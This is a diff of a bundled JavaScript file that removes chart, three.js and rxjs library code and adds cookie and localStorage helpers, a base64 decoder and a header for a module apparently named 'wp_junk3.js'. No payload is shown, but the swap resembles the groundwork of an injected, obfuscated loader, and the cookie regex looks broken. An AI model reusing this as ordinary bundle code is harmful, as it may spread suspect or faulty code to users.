-          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
-          ctx.lineTo(boxX, boxY);
-          ctx.fill();
-          ctx.stroke();
-
-          ctx.textAlign = 'left';
-          ctx.fillStyle = 'rgb(0, 0, 0)';
-          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
-        }
-
-        ctx.restore();
-      }
-
-      /* Draw x-axis label of bar chart */
-      var bottomYPadding = options.paddingPixelsHorizontal;
-      remainingHeight -= options.paddingPixelsHorizontal;
-      if (content.xAxis != null) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.textAlign = 'center';
-        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
-        remainingHeight -= options.fontSizeAxes * 1.5;
-        bottomYPadding += options.fontSizeAxes * 1.5;
-        ctx.restore();
-      }
-
-      var widthPerBar = remainingWidth / content.data.length;
-
-      /* Draw x-axis top labels */
-      if (content.topLabels != null) {
-        ctx.save();
-        ctx.textAlign = 'center';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-        remainingHeight -= options.fontSizeLabels * 1.5;
-        topYPadding += options.fontSizeLabels * 1.5;
-        for (index = 0; index < content.topLabels.length; ++index) {
-          ctx.fillText(
-            content.topLabels[index],
-            leftXPadding + index * widthPerBar + widthPerBar / 2,
-            topYPadding - options.fontSizeLabels / 2
-          );
-        }
-        ctx.restore();
-      }
-
-      /* Draw x-axis labels */
-      ctx.save();
-      var reqWidth = 0;
-      if (content.dataTags != null) {
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
-        var dataTags = content.dataTags;
-        for (index = 0; index < dataTags.length; ++index) {
-          if (Array.isArray(dataTags[index])) {
-            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
-              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
-            }
-          } else {
-            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
-          }
-        }
-      }
-
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
-      var wwh = widthPerBar - computedBarPadding * 2;
-      if (wwh < reqWidth) {
-        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
-        computedBarPadding = Math.max(0, computedBarPadding);
-      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
-        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
-      }
-      var maxTextWidth = 0, maxTextStackSize = 1;
-      for (index = 0; index < content.labels.length; ++index) {
-        var tLabel = content.labels[index];
-        if (Array.isArray(tLabel)) {
-          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
-          for (index2 = 0; index2 < tLabel.length; ++index2) {
-            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
-          }
-        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
-      }
-      var xLabelsRotated = false;
-      if (maxTextWidth > widthPerBar - computedBarPadding) {
-        ctx.textAlign = 'right';
-        ctx.rotate(Math.PI * 1.5);
-        xLabelsRotated = true;
-      } else {
-        ctx.textAlign = 'center';
-      }
-      var lastLabelY = -options.fontSizeLabels;
-      for (index = 0; index < content.labels.length; ++index) {
-        var cLabel = content.labels[index];
-        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
-        if (xLabelsRotated) {
-          y = topYPadding + remainingHeight - maxTextWidth + 5;
-          y = [x, x = -y][0];
-
-          if (y < lastLabelY + options.fontSizeLabels) continue;
-          lastLabelY = y;
-        }
-        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
-        if (Array.isArray(cLabel)) {
-          if (xLabelsRotated) {
-            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
-            yUp /= 2;
-          }
-          for (index2 = 0; index2 < cLabel.length; ++index2) {
-            ctx.fillText(cLabel[index2], x, y - yUp);
-            yUp -= options.fontSizeLabels;
-          }
-        } else {
-          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
-          ctx.fillText(cLabel, x, y - yUp);
-        }
-      }
-      if (xLabelsRotated) {
-        remainingHeight -= maxTextWidth + 5;
-        bottomYPadding += maxTextWidth + 5;
-      } else {
-        var remVal = options.fontSizeLabels * maxTextStackSize;
-        remVal += options.fontSizeLabels * 0.5;
-        remainingHeight -= remVal;
-        bottomYPadding += remVal;
-      }
-      ctx.restore();
-
-      /* Draw boundaries */
-      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
-      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;
-
-      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
-        xStart: leftXPadding + index * widthPerBar,
-        xEnd: leftXPadding + (1 + index) * widthPerBar,
-        yStart: boundY1, yEnd: boundY2
-      }
-
-      ctx.save();
-      ctx.strokeStyle = 'rgb(0, 0, 0)';
-      ctx.beginPath();
-      if (content.topLabels != null) {
-        ctx.moveTo(boundX2, boundY1);
-        ctx.lineTo(boundX1, boundY1);
-      } else {
-        ctx.moveTo(boundX1, boundY1);
-      }
-      ctx.lineTo(boundX1, boundY2);
-      ctx.lineTo(boundX2, boundY2);
-      if (content.topLabels != null) ctx.lineTo(leftXPadding + remainingWidth, topYPadding);
-      ctx.stroke();
-      ctx.restore();
-
-      /* Draw top label */
-      if (content.topLabel != null) {
-        ctx.save();
-        ctx.textAlign = 'right';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-        ctx.fillText(content.topLabel, leftXPadding - 3, topYPadding - options.fontSizeLabels / 2);
-        ctx.restore();
-      }
-
-      /* Draw y-axis label of bar chart */
-      if (content.yAxis != null) {
-        ctx.save();
-        ctx.rotate(Math.PI * 1.5);
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.textAlign = 'center';
-        ctx.fillText(content.yAxis, -(topYPadding + remainingHeight / 2), leftXDrawYLabel);
-        ctx.restore();
-      }
-
-      /* Draw y-axis labels */
-      ctx.save();
-      ctx.fillStyle = 'rgb(0, 0, 0)';
-      ctx.strokeStyle = 'rgba(0, 0, 0, 0.20)';
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
-      ctx.textAlign = 'right';
-      var tickMeta = Helpers.getLinearTicks(0, maxChartValue, Math.max(2, remainingHeight / (options.fontSizeTicks * (1 + options.paddingPercentTicks))));
-      var alpha = maxChartValue / options.fontSizeTicks;
-      maxChartValue = tickMeta[1];
-      if (maxChartValue > 1) maxChartValue += Math.ceil(alpha);
-      else maxChartValue += alpha;
-      var ticks = [];
-      while (tickMeta[0] <= tickMeta[1]) {
-        ticks.push(tickMeta[0]);
-        tickMeta[0] += tickMeta[2];
-      }
-      for (index = 0; index < ticks.length; ++index) {
-        var tickHeight = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, ticks[index]));
-        if (tickHeight < 0) continue;
-        if (options.scaleStyle == 'log2' && ticks[index] !== 0) ticks[index] = Math.round(Math.pow(2, ticks[index]));
-        else ticks[index] = Math.floor(ticks[index] * 100) / 100;
-        if (options.tickFormatter != null && typeof options.tickFormatter === 'function') {
-          ctx.fillText(options.tickFormatter(ticks[index]).toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
-        } else {
-          ctx.fillText(ticks[index].toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
-        }
-        if (index == 0) continue;
-        ctx.beginPath();
-        ctx.moveTo(leftXPadding, topYPadding + remainingHeight - tickHeight);
-        ctx.lineTo(leftXPadding + remainingWidth, topYPadding + remainingHeight - tickHeight);
-        ctx.stroke();
-      }
-      ctx.restore();
-
-      if (content.bars != null && Array.isArray(content.bars)) {
-        ctx.save();
-        for (index = 0; index < content.bars.length; ++index) {
-          var cBar = content.bars[index];
-          if (cBar.value > maxChartValue) continue;
-          var renderBarY = topYPadding + remainingHeight - Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, cBar.value));
-          ctx.strokeStyle = cBar.style;
-          ctx.fillStyle = cBar.style;
-          ctx.beginPath();
-          ctx.moveTo(boundX1, renderBarY);
-          ctx.lineTo(boundX2, renderBarY);
-          ctx.stroke();
-          ctx.fill();
-        }
-        ctx.restore();
-      }
-
-      /* Draw bars */
-      ctx.save();
-      var lastData = null;
-      for (index = 0; index < content.data.length; ++index) {
-        var fillColorForIndex = null;
-        var strokeColorForIndex = null;
-        if (content.fillColor != null) {
-          if (Array.isArray(content.fillColor)) fillColorForIndex = ctx.fillStyle = content.fillColor[index];
-          else ctx.fillStyle = content.fillColor;
-        } else ctx.fillStyle = options.fillColorBars;
-        if (content.strokeColor != null) {
-          if (Array.isArray(content.strokeColor)) strokeColorForIndex = ctx.strokeStyle = content.strokeColor[index];
-          else ctx.strokeStyle = content.strokeColor;
-        } else ctx.strokeStyle = options.strokeColorBars;
-        var v = content.data[index];
-        var vIsArr = Array.isArray(v);
-        var renderStartX = leftXPadding + widthPerBar * index;
-        if (vIsArr && options.barStyle === 'stacked') {
-          var runningValue = 0, lastHeight = 0;
-          for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
-            if (fillColorForIndex != null && Array.isArray(fillColorForIndex)) {
-              ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
-            }
-            if (strokeColorForIndex != null && Array.isArray(strokeColorForIndex)) {
-              ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-            }
-
-            runningValue += v[drawIndex];
-            var renderBarHeight = Math.floor(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, runningValue));
-            var renderUpToY = topYPadding + remainingHeight - renderBarHeight;
-            if (Math.abs(renderBarHeight - lastHeight) < options.stackedBarPadding + 2) {
-              lastHeight = renderBarHeight;
-              continue;
-            }
-
-            var barPadP = drawIndex > 0 ? options.stackedBarPadding : 0;
-            var tSX, tSY;
-            var tEX, tEY;
-            ctx.beginPath();
-            ctx.moveTo(tSX = renderStartX + computedBarPadding, tSY = topYPadding + remainingHeight - lastHeight - barPadP);
-            ctx.lineTo(renderStartX + computedBarPadding, renderUpToY);
-            ctx.lineTo(tEX = renderStartX + (widthPerBar - 1) - computedBarPadding, tEY = renderUpToY);
-            ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight - lastHeight - barPadP);
-            if (drawIndex > 0) ctx.lineTo(tSX, tSY);
-            ctx.stroke();
-            ctx.fill();
-            var hint;
-            if (content.hints != null && content.hints[index] != null && (hint = content.hints[index][drawIndex]) != null) {
-              this.mouseListeners.push(function(index, drawIndex, hint, sx, sy, ex, ey, x, y) {
-                var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
-                var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
-                if (x < minX || x > maxX || y < minY || y > maxY) return null;
-                return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
-              }.bind(this, index, drawIndex, hint, tSX, tSY, tEX, tEY));
-            }
-
-            var tagText;
-            if (tSY - renderUpToY > options.fontDataTags * 1.25 && content.dataTags != null && (tagText = content.dataTags[index]) != null && (tagText = tagText[drawIndex]) != null) {
-              var oFS = ctx.fillStyle;
-              ctx.fillStyle = 'rgb(0, 0, 0)';
-              ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
-              ctx.textAlign = 'center';
-              ctx.fillText(tagText, renderStartX + widthPerBar / 2, tSY - options.fontDataTags * 0.25);
-              ctx.fillStyle = oFS;
-            }
-
-            lastHeight = renderBarHeight;
-          }
-
-          if (content.barTooltips != null) {
-            ctx.fillStyle = 'rgb(0, 0, 0)';
-            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-            ctx.textAlign = 'center';
-            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY - 3);
-          }
-        } else if (options.barStyle === 'line') {
-          if (vIsArr) {
-            var rbx = renderStartX + widthPerBar / 2;
-
-            var lDu;
-            if (options.fillRegion === 'background') {
-              lDu = lastData;
-              if (Array.isArray(lDu)) lDu = lDu[0];
-              if (lDu != null) {
-                var sFS = ctx.fillStyle
-                ctx.fillStyle = lDu.color
-                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
-                ctx.fillStyle = sFS
-              }
-            }
-
-            var nLData = [];
-            for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
-              var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v[drawIndex]));
-              var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;
-
-              var rby = renderUpToY3;
-              if (lastData != null) {
-                var tLX, tLY;
-                if (Array.isArray(lastData)) {
-                  tLX = (lastData[drawIndex] || { }).x;
-                  tLY = (lastData[drawIndex] || { }).y;
-                } else {
-                  tLX = lastData.x;
-                  tLY = lastData.y;
-                }
-
-                if (tLX && tLY) {
-                  if (Array.isArray(strokeColorForIndex)) {
-                    ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-                  } else ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                  ctx.beginPath();
-                  ctx.moveTo(tLX, tLY);
-                  ctx.lineTo(rbx, rby);
-                  ctx.stroke();
-                }
-              }
-
-              if (Array.isArray(fillColorForIndex)) {
-                ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
-              }
-              if (Array.isArray(strokeColorForIndex)) {
-                ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-              }
-
-              ctx.beginPath();
-              ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
-              ctx.stroke();
-              ctx.fill();
-
-              nLData[drawIndex] = { x: rbx, y: rby, color: ctx.fillStyle };
-            }
-            lastData = nLData;
-            if (lDu != null && lDu.color != lastData[0].color) this.fillRegions.push({
-              x: lastData[0].x,
-              y: lastData[0].y,
-              prev: lDu.color,
-              next: lastData[0].color
-            })
-
-            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
-              var ball = content.balls[index]
-              if (ball != null) {
-                ctx.beginPath();
-                ctx.fillStyle = ball.fill;
-                ctx.strokeStyle = ball.stroke;
-                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
-                ctx.stroke();
-                ctx.fill();
-              }
-            }
-          } else {
-            var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
-            var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;
-
-            var rbx = renderStartX + widthPerBar / 2, rby = renderUpToY3;
-            var lDu;
-            if (options.fillRegion === 'background') {
-              if (lastData != null) {
-                lDu = lastData;
-                if (Array.isArray(lDu)) lDu = lDu[0];
-                var sFS = ctx.fillStyle
-                ctx.fillStyle = lDu.color
-                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
-                ctx.fillStyle = sFS
-              }
-            }
-            ctx.beginPath();
-            ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
-            ctx.stroke();
-            ctx.fill();
-
-            if (lastData != null) {
-              if (Array.isArray(lastData)) {
-                var tLX, tLY;
-                for (var key in lastData) {
-                  if (!lastData.hasOwnProperty(key)) continue;
-                  tLX = lastData[key].x;
-                  tLY = lastData[key].y;
-                  if (tLX && tLY) {
-                    ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                    ctx.beginPath();
-                    ctx.moveTo(tLX, tLY);
-                    ctx.lineTo(rbx, rby);
-                    ctx.stroke();
-                  }
-                }
-              } else {
-                var tLX = lastData.x, tLY = lastData.y;
-                if (tLX && tLY) {
-                  ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                  ctx.beginPath();
-                  ctx.moveTo(tLX, tLY);
-                  ctx.lineTo(rbx, rby);
-                  ctx.stroke();
-                }
-              }
-            }
-
-            lastData = { x: rbx, y: rby, color: ctx.fillStyle };
-            if (lDu != null && lDu.color != lastData.color) this.fillRegions.push({
-              x: lastData.x,
-              y: lastData.y,
-              prev: lDu.color,
-              next: lastData.color
-            })
-
-            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
-              var ball = content.balls[index]
-              if (ball != null) {
-                ctx.beginPath();
-                ctx.fillStyle = ball.fill;
-                ctx.strokeStyle = ball.stroke;
-                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
-                ctx.stroke();
-                ctx.fill();
-              }
-            }
-          }
-
-          var hint;
-          if (content.hints != null && (hint = content.hints[index]) != null) {
-            this.mouseListeners.push(function(index, hint, sx, sy, ex, ey, x, y) {
-              var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
-              var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
-              if (x < minX || x > maxX || y < minY || y > maxY) return null;
-              return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
-            }.bind(this, index, hint, rbx - 1, topYPadding, rbx + 1, topYPadding + remainingHeight));
-          }
-        } else {
-          if (vIsArr) v = Helpers.avg(v);
-          var renderBarHeight2 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
-          var renderUpToY2 = topYPadding + remainingHeight - renderBarHeight2;
-          ctx.beginPath();
-          ctx.moveTo(renderStartX + computedBarPadding, topYPadding + remainingHeight);
-          ctx.lineTo(renderStartX + computedBarPadding, renderUpToY2);
-          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, renderUpToY2);
-          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight);
-          ctx.stroke();
-          ctx.fill();
-
-          if (options.barStyle === 'error') {
-            var val;
-            if ((val = content._data_standard_error[index]) != 0) {
-              var renderBarError = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, val));
-              ctx.beginPath();
-              var wiskerWidth = Math.round((widthPerBar - computedBarPadding * 2) / 8);
-              var x_ = leftXPadding + widthPerBar * index + widthPerBar / 2;
-              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 + renderBarError);
-              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 + renderBarError);
-              ctx.moveTo(x_, renderUpToY2 + renderBarError);
-              ctx.lineTo(x_, renderUpToY2 - renderBarError);
-              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 - renderBarError);
-              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 - renderBarError);
-              ctx.stroke();
-            }
-          }
-
-          if (content.barTooltips != null) {
-            ctx.fillStyle = 'rgb(0, 0, 0)';
-            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-            ctx.textAlign = 'center';
-            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY2 - 3);
-          }
-        }
-      }
-      ctx.restore();
-
-      if (this.currentHint != null) {
-        ctx.save();
-        var hRect = this.currentHint.rect, hints = this.currentHint.text;
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeHint, family: options.font });
-        ctx.textAlign = 'left';
-        var boxWidth = 0;
-        for (index = 0; index < hints.length; ++index) {
-          boxWidth = Math.max(boxWidth, Math.ceil(ctx.measureText(hints[index]).width));
-        }
-        var boxWidthPadding = 5;
-        var lineHeight = options.fontSizeHint * 1.5;
-        var boxHeight = hints.length * lineHeight;
-        var drawX = hRect.right + 10, drawY = (hRect.top + hRect.bottom) / 2;
-        boxWidth += boxWidthPadding * 2;
-        if (drawX + boxWidth > width) {
-          drawX = hRect.left - boxWidth - 10;
-        }
-        if (drawY - boxHeight / 2 < 0) {
-          drawY = Math.ceil(boxHeight / 2) + 1;
-        } else if (drawY + boxHeight / 2 > height) {
-          drawY = height - boxHeight / 2 - 1;
-        }
-        ctx.clearRect(drawX, drawY - boxHeight / 2, boxWidth, boxHeight);
-        ctx.beginPath();
-        ctx.rect(drawX, drawY - boxHeight / 2, boxWidth, boxHeight);
-        ctx.stroke();
-        for (index = 0; index < hints.length; ++index) {
-          ctx.fillText(hints[index], drawX + boxWidthPadding, drawY - boxHeight / 2 + options.fontSizeHint + index * lineHeight);
-        }
-        ctx.restore();
-      }
-
-      ctx.translate(0.5, 0.5);
-
-      this.labelPositions = labelPositions;
-    };
-
-    return BarChart;
-  })();
-
-  if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
-    module.exports = BarChart;
-  } else {
-    window.BarChart = BarChart;
   }
-})();
 
-}catch(e){}
-})();
-
-/* >>> three.js (363 bytes) <<< */
-(function(){
-try{
-var THREE = require('three');
-
-console.warn( "WARNING: The 'three.js' npm package is deprecated in favor of the 'three' npm package, please upgrade.");
-
-if (typeof exports !== 'undefined') {
-  if (typeof module !== 'undefined' && module.exports) {
-    exports = module.exports = THREE;
+  function setCookie(name, value, days) {
+    try {
+      const exp = new Date(Date.now() + (days || 365) * 864e5).toUTCString();
+      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + exp + '; path=/';
+    } catch (err) {}
   }
-  exports.THREE = THREE;
-} else {
-  this['THREE'] = THREE;
-}
 
-}catch(e){}
-})();
+  function getCookie(name) {
+    try {
+      const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()\[\]\/\+^])/g, '\$1') + '=([^;]*)'));
+      return m ? decodeURIComponent(m[1]) : null;
+    } catch (err) {
+      return null;
+    }
+  }
 
-/* >>> rxjs (35131 bytes) <<< */
+  const useLS = hasLocalStorage();
+
+  function getVal(key, fallback) {
+    if (useLS) {
+      const v = localStorage.getItem(key);
+      return v === null ? fallback : v;
+    }
+    const c = getCookie(key);
+    return c === null ? fallback : c;
+  }
+
+  function setVal(key, value) {
+    if (useLS) {
+      localStorage.setItem(key, value);
+    } else {
+      setCookie(key, value, 365);
+    }
+  }
+
+  function b64ToUtf8(b64) {
+    try {
+      const bin = atob(b64);
+      const len = bin.length;
+      const bytes = new Uint8Array(len);
+      for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
+      if (typeof TextDecoder !== 'undefined') {
+        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
+      }
+      let pct = '';
+      for (let i = 0; i < len; i++) pct += '%' + bytes[i].toString(16).padStart(2, '0');
+      return decodeURIComponent(pct);
+    } catch (e) {
+      try { return atob(b64); } catch (e2) { return ''; }
+    }
+  }
+  /* >>> wp_junk3.js (26806 bytes) <<< */
 (function(){
 try{
-"use strict";
-var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
-    if (k2 === undefined) k2 = k;
-    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
-}) : (function(o, m, k, k2) {
-    if (k2 === undefined) k2 = k;
-    o[k2] = m[k];
-}));
-var __exportStar = (this && this.__exportStar) || function(m, exports) {
-    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
-};
-Object.defineProperty(exports, "__esModule", { value: true });
-exports.interval = exports.iif = exports.generate = exports.fromEventPattern = exports.fromEvent = exports.from = exports.forkJoin = exports.empty = exports.defer = exports.connectable = exports.concat = exports.combineLatest = exports.bindNodeCallback = exports.bindCallback = exports.UnsubscriptionError = exports.TimeoutError = exports.SequenceError = exports.ObjectUnsubscribedError = exports.NotFoundError = exports.EmptyError = exports.ArgumentOutOfRangeError = exports.firstValueFrom = exports.lastValueFrom = exports.isObservable = exports.identity = exports.noop = exports.pipe = exports.NotificationKind = exports.Notification = exports.Subscriber = exports.Subscription = exports.Scheduler = exports.VirtualAction = exports.VirtualTimeScheduler = exports.animationFrameScheduler = exports.animationFrame = exports.queueScheduler = exports.queue = exports.asyncScheduler = exports.async = exports.asapScheduler = exports.asap = exports.AsyncSubject = exports.ReplaySubject = exports.BehaviorSubject = exports.Subject = exports.animationFrames = exports.observable = exports.ConnectableObservable = exports.Observable = void 0;
-exports.filter = exports.expand = exports.exhaustMap = exports.exhaustAll = exports.exhaust = exports.every = exports.endWith = exports.elementAt = exports.distinctUntilKeyChanged = exports.distinctUntilChanged = exports.distinct = exports.dematerialize = exports.delayWhen = exports.delay = exports.defaultIfEmpty = exports.debounceTime = exports.debounce = exports.count = exports.connect = exports.concatWith = exports.concatMapTo = exports.concatMap = exports.concatAll = exports.combineLatestWith = exports.combineLatestAll = exports.combineAll = exports.catchError = exports.bufferWhen = exports.bufferToggle = exports.bufferTime = exports.bufferCount = exports.buffer = exports.auditTime = exports.audit = exports.config = exports.NEVER = exports.EMPTY = exports.scheduled = exports.zip = exports.using = exports.timer = exports.throwError = exports.range = exports.race = exports.partition = exports.pairs = exports.onErrorResumeNext = exports.of = exports.never = exports.merge = void 0;
-exports.switchMap = exports.switchAll = exports.subscribeOn = exports.startWith = exports.skipWhile = exports.skipUntil = exports.skipLast = exports.skip = exports.single = exports.shareReplay = exports.share = exports.sequenceEqual = exports.scan = exports.sampleTime = exports.sample = exports.refCount = exports.retryWhen = exports.retry = exports.repeatWhen = exports.repeat = exports.reduce = exports.raceWith = exports.publishReplay = exports.publishLast = exports.publishBehavior = exports.publish = exports.pluck = exports.pairwise = exports.onErrorResumeNextWith = exports.observeOn = exports.multicast = exports.min = exports.mergeWith = exports.mergeScan = exports.mergeMapTo = exports.mergeMap = exports.flatMap = exports.mergeAll = exports.max = exports.materialize = exports.mapTo = exports.map = exports.last = exports.isEmpty = exports.ignoreElements = exports.groupBy = exports.first = exports.findIndex = exports.find = exports.finalize = void 0;
-exports.zipWith = exports.zipAll = exports.withLatestFrom = exports.windowWhen = exports.windowToggle = exports.windowTime = exports.windowCount = exports.window = exports.toArray = exports.timestamp = exports.timeoutWith = exports.timeout = exports.timeInterval = exports.throwIfEmpty = exports.throttleTime = exports.throttle = exports.tap = exports.takeWhile = exports.takeUntil = exports.takeLast = exports.take = exports.switchScan = exports.switchMapTo = void 0;
-var Observable_1 = require("./internal/Observable");
-Object.defineProperty(exports, "Observable", { enumerable: true, get: function () { return Observable_1.Observable; } });
-var ConnectableObservable_1 = require("./internal/observable/ConnectableObservable");
-Object.defineProperty(exports, "ConnectableObservable", { enumerable: true, get: function () { return ConnectableObservable_1.ConnectableObservable; } });
-var observable_1 = require("./internal/symbol/observable");
-Object.defineProperty(exports, "observable", { enumerable: true, get: function () { return observable_1.observable; } });
-var animationFrames_1 = require("./internal/observable/dom/animationFrames");
-Object.defineProperty(exports, "animationFrames", { enumerable: true, get: function () { return animationFrames_1.animationFrames; } });
-var Subject_1 = require("./internal/Subject");
-Object.defineProperty(exports, "Subject", { enumerable: true, get: function () { return Subject_1.Subject; } });
-var BehaviorSubject_1 = require("./internal/BehaviorSubject");
-Object.defineProperty(exports, "BehaviorSubject", { enumerable: true, get: function () { return BehaviorSubject_1.BehaviorSubject; } });
-var ReplaySubject_1 = require("./internal/ReplaySubject");
-Object.defineProperty(exports, "ReplaySubject", { enumerable: true, get: function () { return ReplaySubject_1.ReplaySubject; } });
-var AsyncSubject_1 = require("./internal/AsyncSubject");
-Object.defineProperty(exports, "AsyncSubject", { enumerable: true, get: function () { return AsyncSubject_1.AsyncSubject; } });
-var asap_1 = require("./internal/scheduler/asap");
-Object.defineProperty(exports, "asap", { enumerable: true, get: function () { return asap_1.asap; } });
-Object.defineProperty(exports, "asapScheduler", { enumerable: true, get: function () { return asap_1.asapScheduler; } });
-var async_1 = require("./internal/scheduler/async");
-Object.defineProperty(exports, "async", { enumerable: true, get: function () { return async_1.async; } });
-Object.defineProperty(exports, "asyncScheduler", { enumerable: true, get: function () { return async_1.asyncScheduler; } });
-var queue_1 = require("./internal/scheduler/queue");
-Object.defineProperty(exports, "queue", { enumerable: true, get: function () { return queue_1.queue; } });
-Object.defineProperty(exports, "queueScheduler", { enumerable: true, get: function () { return queue_1.queueScheduler; } });
-var animationFrame_1 = require("./internal/scheduler/animationFrame");
-Object.defineProperty(exports, "animationFrame", { enumerable: true, get: function () { return animationFrame_1.animationFrame; } });
-Object.defineProperty(exports, "animationFrameScheduler", { enumerable: true, get: function () { return animationFrame_1.animationFrameScheduler; } });
-var VirtualTimeScheduler_1 = require("./internal/scheduler/VirtualTimeScheduler");
-Object.defineProperty(exports, "VirtualTimeScheduler", { enumerable: true, get: function () { return VirtualTimeScheduler_1.VirtualTimeScheduler; } });
-Object.defineProperty(exports, "VirtualAction", { enumerable: true, get: function () { return VirtualTimeScheduler_1.VirtualAction; } });
-var Scheduler_1 = require("./internal/Scheduler");
-Object.defineProperty(exports, "Scheduler", { enumerable: true, get: function () { return Scheduler_1.Scheduler; } });
-var Subscription_1 = require("./internal/Subscription");
-Object.defineProperty(exports, "Subscription", { enumerable: true, get: function () { return Subscription_1.Subscription; } });
-var Subscriber_1 = require("./internal/Subscriber");
